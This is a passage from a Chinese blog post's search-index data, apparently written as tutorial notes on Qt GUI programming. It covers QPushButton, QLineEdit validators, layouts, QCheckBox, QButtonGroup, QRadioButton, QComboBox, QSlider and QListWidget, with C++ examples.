","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:7:5","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QPushButton ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:8:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"事件信号 void QAbstractButton::click() void QAbstractButton::clicked(bool checked = false) //是否选中 void QAbstractButton::pressed() void QAbstractButton::released() ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:8:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"设置快捷键 法一 在英文按钮前加\u0026符号. 这样的话,通过快捷键Alt + P就可以激发click信号了. 法二 ui.btn_shortCut-\u003esetShortcut(tr(\"Alt+x\")); ui.btn_shortCut-\u003esetShortcut(tr(\"Alt+x,Ctrl+c\")); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:8:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QLineEdit ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:9:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"常用函数 void setText(QString); //设置文本,槽函数 不发信号 QString text();//获取文本 void setPlaceholderText(const QString \u0026);//设置提示文字 void setClearButtonEnabled(bool enable);//是否设置一个清空按钮 void setReadOnly(bool); void setMaxLength(int); void setEchoMode(QLineEdit::EchoMode);//设置行编辑框内文本的显示模式 //最常用的模式,分别为:QLineEdit::Normal,QLineEdit::Password.默认为QLineEdit::Normal. void setDragEnabled(bool); //设置行编辑框内的被选择的文本能否被拖拽,默认不能被拖拽 void setAcceptDrops(bool); //设置行编辑框能否被拖拽进来文本. bool isModified(); //判断文本是否被修改. void selectAll(); //选中框内所有文本. QString displayText(); //返回显示的文本. QString selectedText(); //返回被选中的文本. void setInputMask(const QString \u0026inputMask);//格式掩码 void setValidator(QVaildator*); //设置输入验证器 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:9:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"事件信号 void editingFinished();//按下回车,焦点移开 void returnPressed();//格式有效,如setInputMask的参数为\"NNN\",则编辑框内必须输入3个英文字母或者数字,此时按回车,方可激发该信号 void textChanged(const QString \u0026text);//setText()也会激发这个信号 void textEdited(const QString \u0026text); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:9:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"格式掩码 假如说编辑框中要设置格式,比如说要指定输入IP地址 ui.Edt_IP-\u003esetInputMask(\"000.000.000.000;_\"); //;后面的_,表示无输入时,填_ ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:9:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"格式校验 设置有效范围 #include \u003cQIntValidator\u003e#include \u003cQDoubleValidator\u003e //设置只输入整型,设置有效范围为10, 100 QIntValidator* iVal = new QIntValidator(); iVal-\u003esetRange(10, 100); ui.Edt_Int-\u003esetValidator(iVal); //设置只输入浮点,设置有效范围为10, 20,精度为2,即小数点后面有两位 QDoubleValidator* dVal = new QDoubleValidator(0); dVal-\u003esetRange(10, 20, 3); dVal-\u003esetNotation(QDoubleValidator::StandardNotation); ui.Edt_Double-\u003esetValidator(dVal); //验证邮箱 QRegExp exp(\"[a-zA-Z0-9-_]+@[a-zA-Z0-9_]+\\\\.[a-zA-Z]+\"); QRegExpValidator* rVal = new QRegExpValidator(); rVal-\u003esetRegExp(exp); ui.Edt_RegExp-\u003esetValidator(rVal); 需要注意的是,上述是设置LineEdit的有效范围,并不是限制输入的范围,如果想要限制输入的范围,我们可以使用QSpinBox、QDoubleSpinBox. ui.spinBox-\u003esetRange(10, 20); ui.doubleSpinBox-\u003esetRange(1.0, 20.0); 校验是否有效 我们可以设置一个按钮,当编辑框输入内容后,点击按钮来校验. const QValidator* pQValidator = ui.Edt_Int-\u003evalidator(); int pos = 0; int nRet = pQValidator-\u003evalidate(ui.Edt_Int-\u003etext(), pos); if (nRet == QValidator::Acceptable) { qDebug() \u003c\u003c QStringLiteral(\"格式正确\"); } //nRet的返回值有以下三种 //QValidator::Invalid 格式正确 //QValidator::Intermediate 中间输入没结束 //QValidator::Acceptable 格式正确 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:9:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"布局 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:10:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"遍历QObject子节点 QObjectList cs = this-\u003echildren(); for (int i = 0; i \u003c cs.size(); i++) { //遍历子节点, 获取节点对象名称 qDebug() \u003c\u003c cs[i]-\u003eobjectName(); //遍历子节点, 获取节点对象类型 const QMetaObject* oj = cs[i]-\u003emetaObject(); qDebug() \u003c\u003c oj-\u003eclassName(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:10:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"递归遍历QObject子节点 可以遍历子节点的子节点. void PrintName(QObject* obj) { if (!obj) //为空直接返回 { return; } printf(\"%s :\", obj-\u003eobjectName().toStdString().c_str()); const QMetaObject* mobj = obj-\u003emetaObject(); //获取元数据 QString cname = mobj-\u003eclassName(); printf(\"%s\\n\", cname.toStdString().c_str()); //对PushButton进行操作 if (cname == \"QPushButton\") { QPushButton* pb = qobject_cast\u003cQPushButton*\u003e(obj); if (pb) { pb-\u003esetText(pb-\u003etext() + \"class\"); } } //递归打印名字 QObjectList cs = obj-\u003echildren(); if (cs.size() \u003c= 0) { return; } for (int i = 0; i \u003c cs.size(); i++) { PrintName(cs[i]); } } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:10:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QSizePolicy布局尺寸策略分析 有四种布局: Vertical Layout Horizontal Layout Grid Layout Form Layout SizeHint推荐尺寸 QSize sizeHint() //推荐尺寸,只能重载修改 QSize size() //不包含边框的窗口尺寸 QSizePolicy::PolicyFlag QSizePolicy::GrowFlag //必要时可超过推荐 QSizePolicy::ExpandFlag //尽可能的拓展 QSizePolicy::ShrinkFlag //必要时可小于推荐 QSizePolicy::IgnoreFlag //缺省大小被忽略 QSizePolicy::Policy QSizePolicy::Policy QSizePolicy::PolicyFlag Fixed 0 只参考sizeHint() Minimum GrowFlag 伸展和收缩 \u003e= sizeHint() Maximum ShrinkFlag 伸展和收缩 \u003c= sizeHint() Preferred GrowFlag | ShrinkFlag Expanding GrowFlag | ShrinkFlag | ExpandFlag 尽量缩放,最小值为推荐值 MinimumExpanding GrowFlag | ExpandFlag Ignored ShrinkFlag | GrowFlag | IgnoreFlag 忽略推荐大小,尽量缩放 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:10:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QVBoxlayout,QHBoxLayout #include \u003cQWidget\u003e#include \u003cQVBoxLayout\u003e#include \u003cQHBoxLayout\u003e#include \u003cQPushButton\u003e int main(int argc, char *argv[]) { QApplication a(argc, argv); //设置全局字体 QFont f(\"Yahei Mono\", 12); a.setFont(f); QWidget* LuoWin = new QWidget; LuoWin-\u003eresize(400, 400); //垂直布局 QVBoxLayout* lay = new QVBoxLayout; //新建一个按钮 QPushButton* btn1 = new QPushButton(\"btn1\"); //设置按钮的尺寸策略, 设置Fixed, 使用推荐尺寸 btn1-\u003esetSizePolicy(QSizePolicy::Expanding, QSizePolicy::Expanding); //设置按钮的最大最小尺寸 btn1-\u003esetMinimumSize(20, 10); btn1-\u003esetMaximumSize(600, 100); QPushButton* btn2 = new QPushButton(\"btn2\"); //布局中添加按钮 lay-\u003eaddWidget(btn1); lay-\u003eaddWidget(btn2); //设置布局的边界, 在LuoWin-\u003eshow()前设置和后面设置是不一样的,在前设置才可以改变btn1-\u003ewidth()的值 lay-\u003esetContentsMargins(0, 0, 0, 0); //设置布局中元素之间的间距,垂直布局,当缩的很小的时候,就可以看到间距了 lay-\u003esetSpacing(10); //添加上述布局 LuoWin-\u003esetLayout(lay); LuoWin-\u003eshow(); //打印推荐尺寸,这个值只有在设置了布局,才可能有效 qDebug() \u003c\u003c \"width:\\t\" \u003c\u003c btn1-\u003esizeHint().width() \u003c\u003c\" height:\" \u003c\u003c btn1-\u003esizeHint().height(); //打印实际尺寸 qDebug() \u003c\u003c \"width:\\t\" \u003c\u003c btn1-\u003ewidth() \u003c\u003c\" height:\" \u003c\u003c btn1-\u003eheight(); return a.exec(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:10:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QGridLayout #include \u003cQWidget\u003e#include \u003cQSizePolicy\u003e#include \u003cQGridLayout\u003e#include \u003cQPushButton\u003e int main(int argc, char *argv[]) { QApplication a(argc, argv); //设置全局字体 QFont f(\"Yahei Mono\", 12); a.setFont(f); QWidget* LuoWin = new QWidget; LuoWin-\u003eresize(200, 200); QGridLayout* lay = new QGridLayout; QPushButton* btn00 = new QPushButton(\"btn00\"); QPushButton* btn02 = new QPushButton(\"btn02\"); QPushButton* btn12 = new QPushButton(\"btn12\"); QPushButton* btn33 = new QPushButton(\"btn33\"); lay-\u003eaddWidget(btn00, 0, 0); lay-\u003eaddWidget(btn02, 0, 2); lay-\u003eaddWidget(btn12, 1, 2); lay-\u003eaddWidget(btn33, 3, 3); //设置控件之间的间距 //水平间距 lay-\u003esetHorizontalSpacing(20); //垂直间距 lay-\u003esetVerticalSpacing(10); //也可以使用setSpacing同时设置水平和垂直间距 //lay-\u003esetSpacing(10); //设置布局的对齐方式 lay-\u003esetAlignment(Qt::AlignLeft); LuoWin-\u003esetLayout(lay); LuoWin-\u003eshow(); return a.exec(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:10:5","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QFormLayout 以下示例,实现遍历FormLayout布局所有元素,并实现空验证和清除. luoqt.h #pragma once #include \u003cQtWidgets/QWidget\u003e#include \"ui_luoqt.h\"#include \u003cQDebug\u003e#include \u003cQFile\u003e #include \u003cQFormLayout\u003e#include \u003cQPushButton\u003e#include \u003cQLineEdit\u003e#include \u003cQLabel\u003eclass luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); public slots: //设置皮肤样式 static void SetStyle(const QString\u0026 styleName); void Save(); void Clear(); private: Ui::luoqtClass ui; }; luoqt.cpp #include \"luoqt.h\" luoqt::luoqt(QWidget *parent) : QWidget(parent) { ui.setupUi(this); //新建一个FormLayout布局 QFormLayout* lay = new QFormLayout; QLineEdit* edtName = new QLineEdit; //创建一个带有给定文本的QLabel及QWidget控件行 lay-\u003eaddRow(\"\u0026Name\", edtName); QLineEdit* edtEmail = new QLineEdit; lay-\u003eaddRow(\"\u0026Email\", edtEmail); QLineEdit* edtAge = new QLineEdit; //插入到下标1的位置, 从0开始 lay-\u003einsertRow(1, \"\u0026Age\", edtAge); //显示出错信息 QLabel* labelInfo = new QLabel; labelInfo-\u003esetText(\"Input\"); labelInfo-\u003esetStyleSheet(\"color:red\"); //插入到下标0的位置, 从0开始 lay-\u003einsertRow(0, \"\", labelInfo); //添加Save clear按钮 QPushButton* btnSave = new QPushButton(\"Save\"); QPushButton* btnClear = new QPushButton(\"Clear\"); //信号槽绑定 QObject::connect(btnSave, SIGNAL(clicked()), this, SLOT(Save())); QObject::connect(btnClear, SIGNAL(clicked()), this, SLOT(Clear())); //添加一个平行布局 QHBoxLayout* hLay = new QHBoxLayout; hLay-\u003eaddWidget(btnSave); hLay-\u003eaddWidget(btnClear); lay-\u003eaddRow(hLay); this-\u003esetLayout(lay); } void luoqt::SetStyle(const QString\u0026 styleName) { QFile file(QString(\"./image/%1.qss\").arg(styleName)); bool b = file.open(QFile::ReadOnly); QString qss = QLatin1String(file.readAll()); qApp-\u003esetStyleSheet(qss); qApp-\u003esetPalette(QPalette(QColor(\"#F0F0F0\"))); } void luoqt::Save() { //扎到layout QFormLayout* lay = (QFormLayout*)this-\u003elayout(); //找到显示错误信息的Label QLabel* label = (QLabel*)lay-\u003eitemAt(0, QFormLayout::FieldRole)-\u003ewidget(); //存放错误信息 QString qstrErr = \"\"; //遍历FormLayout的所有元素 for (int i = 0; i \u003c lay-\u003erowCount(); i++) { //Label QLayoutItem* LabelItem = lay-\u003eitemAt(i, QFormLayout::LabelRole); if (!LabelItem) { continue; } QLabel* titleLabel = (QLabel*)LabelItem-\u003ewidget(); if (!titleLabel) { continue; } //Field QLayoutItem* fieldItem = lay-\u003eitemAt(i, QFormLayout::FieldRole); QLineEdit* pWidget = (QLineEdit*)fieldItem-\u003ewidget(); if (!pWidget) { continue; } QString qstrName = pWidget-\u003emetaObject()-\u003eclassName(); if (qstrName == \"QLineEdit\") { if (pWidget-\u003etext().trimmed() == \"\") { pWidget-\u003esetFocus(); qstrErr += titleLabel-\u003etext(); qstrErr += \"is Empty\\n\"; } } } label-\u003esetText(qstrErr); } void luoqt::Clear() { //扎到layout QFormLayout* lay = (QFormLayout*)this-\u003elayout(); //遍历所有LineEdit //遍历FormLayout的所有元素 for (int i = 0; i \u003c lay-\u003erowCount(); i++) { QLayoutItem* fieldItem = lay-\u003eitemAt(i, QFormLayout::FieldRole); QLineEdit* pWidget = (QLineEdit*)fieldItem-\u003ewidget(); if (!pWidget) { continue; } QString qstrName = pWidget-\u003emetaObject()-\u003eclassName(); if (qstrName == \"QLineEdit\") { pWidget-\u003esetText(\"\"); } } } main.cpp #include \"luoqt.h\"#include \u003cQtWidgets/QApplication\u003e int main(int argc, char *argv[]) { QApplication a(argc, argv); //设置全局字体 QFont f(\"Yahei Mono\", 12); a.setFont(f); luoqt w; w.show(); return a.exec(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:10:6","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QCheckBox 默认多选. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:11:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"常用函数 //文本获取与设置 QString text() const; void setText(const QString \u0026text); //状态获取与设置 bool isChecked() const; void setChecked(bool); //设置自动排他,单选属性 //若同Widget上的两个QCheckBox设置该属性,则每次只能选择其中一个 void setAutoExclusive(bool); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:11:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"事件信号 void QAbstractButton::clicked(bool checked = false);//按钮点击,就会触发该信号 void QAbstractButton::toggled(bool checked); //状态发生变化,就会触发该信号 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:11:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QButtonGroup 将一组按钮放在ButtonGroup上,点击时,可以知道哪个按钮被点击了. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:12:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"常用信号 void buttonClicked(QAbstractButton *button); void buttonClicked(int id); void buttonPressed(QAbstractButton *button); void buttonPressed(int id); void buttonReleased(QAbstractButton *button); void buttonReleased(int id); void buttonToggled(QAbstractButton *button, bool checked); void buttonToggled(int id, bool checked); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:12:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"示例 luoqt.h #include \u003cQCheckBox\u003e#include \u003cQButtonGroup\u003eclass luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); public slots: void LuoClicked(QAbstractButton* button); void LuoToggled(QAbstractButton* button, bool checked); private: Ui::luoqtClass ui; }; luoqt.cpp #include \"luoqt.h\" luoqt::luoqt(QWidget *parent) : QWidget(parent) { ui.setupUi(this); QButtonGroup* btnGroup = new QButtonGroup(this); //加组后,默认变为单选 btnGroup-\u003eaddButton(ui.checkBox1); btnGroup-\u003eaddButton(ui.checkBox2); btnGroup-\u003eaddButton(ui.checkBox3); //改为多选 btnGroup-\u003esetExclusive(false); //信号槽绑定 QObject::connect(btnGroup, SIGNAL(buttonClicked(QAbstractButton*)), this, SLOT(LuoClicked(QAbstractButton*))); QObject::connect(btnGroup, SIGNAL(buttonToggled(QAbstractButton* , bool)), this, SLOT(LuoToggled(QAbstractButton*, bool))); } void luoqt::LuoClicked(QAbstractButton* button) { qDebug() \u003c\u003c \"LuoClicked:\" \u003c\u003c button-\u003etext() \u003c\u003c button-\u003eisChecked(); } void luoqt::LuoToggled(QAbstractButton* button, bool checked) { qDebug() \u003c\u003c \"LuoToggled:\" \u003c\u003c button-\u003etext() \u003c\u003c button-\u003eisChecked(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:12:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QRadioButton 类似QCheckBox, 默认单选 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:13:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"示例 luoqt.h #include \u003cQMessageBox\u003e#include \u003cQPushButton\u003e#include \u003cQRadioButton\u003e#include \u003cQVBoxLayout\u003e#include \u003cQButtonGroup\u003eclass luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); public slots: void LuoSave(); private: Ui::luoqtClass ui; }; luoqt.cpp #include \"luoqt.h\" luoqt::luoqt(QWidget *parent) : QWidget(parent) { ui.setupUi(this); //单选按钮 QRadioButton* btnRadio1 = new QRadioButton(\"btnRadio1\"); QRadioButton* btnRadio2 = new QRadioButton(\"btnRadio2\"); QRadioButton* btnRadio3 = new QRadioButton(\"btnRadio3\"); //按钮组 QButtonGroup* btnGroup = new QButtonGroup(this); btnGroup-\u003esetObjectName(\"btnGroup\");//这里设置ObjectName, 方便下面查找 btnGroup-\u003eaddButton(btnRadio1); btnGroup-\u003eaddButton(btnRadio2); btnGroup-\u003eaddButton(btnRadio3); //垂直布局 QVBoxLayout* layVbox = new QVBoxLayout(this); //遍历QButtonGroup for (int i = 0; i \u003c btnGroup-\u003ebuttons().size(); i++) { layVbox-\u003eaddWidget(btnGroup-\u003ebuttons()[i]); } //保存按钮 QPushButton* btnSave = new QPushButton(\"Save\"); layVbox-\u003eaddWidget(btnSave); QObject::connect(btnSave, SIGNAL(clicked()), this, SLOT(LuoSave())); } void luoqt::LuoSave() { //获取btnGroup QButtonGroup* btnGroup = this-\u003efindChild\u003cQButtonGroup*\u003e(\"btnGroup\"); if (!btnGroup) { return; } //获取被选中的按钮 QRadioButton* btnSelRadio = (QRadioButton*)btnGroup-\u003echeckedButton(); if (!btnSelRadio) { QMessageBox::warning(this, \"\", \"Please checked!\"); } else { QMessageBox::information(this, \"\", btnSelRadio-\u003etext()); } } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:13:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QComboBox ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:14:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"常用函数 //新增数据 void addItem(const QString \u0026text, const QVariant \u0026userData = QVariant()); void addItem(const QIcon \u0026icon, const QString \u0026text, const QVariant \u0026userData = QVariant()); void addItems(const QStringList \u0026texts); //插入数据 void insertItem(int index, const QString \u0026text, const QVariant \u0026userData = QVariant()); void insertItem(int index, const QIcon \u0026icon, const QString \u0026text, const QVariant \u0026userData = QVariant()); void insertItems(int index, const QStringList \u0026list); //QVariant 用户自定义数据 //获取当前下标 int currentIndex() const //获取当前文本 QString currentText() const //删除数据 void removeItem(int index); void clearEditText(); //可编辑模式时,清空 void clear(); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:14:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"事件信号 //用户选中 void activated(int index); void activated(const QString \u0026text); //状态发生变化 void currentIndexChanged(int index); void currentTextChanged(const QString \u0026text); //只读模式没有 void editTextChanged(const QString \u0026text); //选择下拉框,滑过,高亮某行时,就会触发该信号 void highlighted(int index) void highlighted(const QString \u0026text) ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:14:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"示例 luoqt.h #include \u003cQIcon\u003e#include \u003cQComboBox\u003eclass luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); public slots: void LuoClick(); private: Ui::luoqtClass ui; }; luoqt.cpp #include \"luoqt.h\" struct LuoType { int x; int y; }; //使Qt支持此类型 Q_DECLARE_METATYPE(LuoType) luoqt::luoqt(QWidget *parent) : QWidget(parent) { ui.setupUi(this); ui.comboBox-\u003eclear(); //添加用户自定义数据 LuoType luoType; luoType.x = 100; QVariant var; var.setValue(luoType); ui.comboBox-\u003eaddItem(\"001\", var); QIcon icon(\":/luoqt/kenan.png\"); ui.comboBox-\u003eaddItem(icon, \"002\"); ui.comboBox-\u003einsertItem(1, \"003\"); } void luoqt::LuoClick() { //获取当前行下标 qDebug() \u003c\u003c ui.comboBox-\u003ecurrentIndex();; //打印第0行的自定义数据 qDebug() \u003c\u003c ui.comboBox-\u003eitemText(0); QVariant var = ui.comboBox-\u003eitemData(0); qDebug() \u003c\u003c var.value\u003cLuoType\u003e().x; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:14:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QSlider ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:15:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"属性 setRange(int min, int max); //键盘,方向键控制 void setSingleStep(int); //鼠标, 这里通过鼠标点击,并不是点到哪里,就拖动到哪里 void setPageStep(int); //方向 void setOrientation(Qt::Orientation); //Qt::Horizontal //Qt::Vertical ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:15:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"事件信号 void sliderMoved(int value);//拖动 void sliderPressed();//点击滑块 void sliderReleased();//松开滑块 void valueChanged(int value);//点击或者设置 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:15:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"重载鼠标事件 实现鼠标点击到哪里,滑块就滑动到哪里. 新建一个类LuoSlider,继承QSlider,重载mousePressEvent LuoSlider.h #include \u003cQSlider\u003e#include \u003cQWidget\u003e#include \u003cQMouseEvent\u003e#include \u003cQDebug\u003eclass LuoSlider : public QSlider { public: LuoSlider(QWidget* p = NULL); ~LuoSlider(); public: virtual void mousePressEvent(QMouseEvent* e); }; LuoSlider.cpp #include \"LuoSlider.h\" LuoSlider::LuoSlider(QWidget* p /*= NULL*/):QSlider(p) { } LuoSlider::~LuoSlider() { } void LuoSlider::mousePressEvent(QMouseEvent* e) { double dbl = (double)e-\u003epos().x() / (double)width(); int nVal = dbl * (maximum() - minimum()) + minimum(); setValue(nVal); QSlider::mousePressEvent(e); qDebug() \u003c\u003c e-\u003epos().x(); } 将新建的类LuoSlider与界面上的QSlider关联 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:15:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QListWidget ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:16:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"属性 //单选,多选 QAbstractItemView::SelectionMode selectionMode() const; void setSelectionMode(QAbstractItemView::SelectionMode mode); enum SelectionMode { NoSelection, SingleSelection, //单选 MultiSelection, //多选 ExtendedSelection, //Ctrl + 鼠标 多选, Shift + 鼠标 连续选 ContiguousSelection //Ctrl + 鼠标 以及 Shift + 鼠标 都是连续选 }; //从上到下或从左到右排列 flow //每一行的行高 gridSize //图标的宽高 iconSize ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:16:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"常用函数 //新增数据 void addItem(const QString \u0026label); void addItem(QListWidgetItem *item); void addItems(const QStringList \u0026labels); //添加数据 void insertItem(int row, QListWidgetItem *item); void insertItem(int row, const QString \u0026label); void insertItems(int row, const QStringList \u0026labels); //获取ListWidget, item个数 int count() const; //获取当前行数据 QListWidgetItem *currentItem() const; int currentRow() const; //设置列表控件的编辑策略 void setEditTriggers(QAbstractItemView::EditTriggers triggers); enum EditTrigger { NoEditTriggers = 0, CurrentChanged = 1, DoubleClicked = 2, SelectedClicked = 4, EditKeyPressed = 8, AnyKeyPressed = 16, AllEditTriggers = 31 }; //排序 void sortItems(Qt::SortOrder order = Qt::AscendingOrder); //将列表控件的某一项,设置为控件 void setItemWidget(QListWidgetItem *item, QWidget *widget) //Public Slots void clear(); 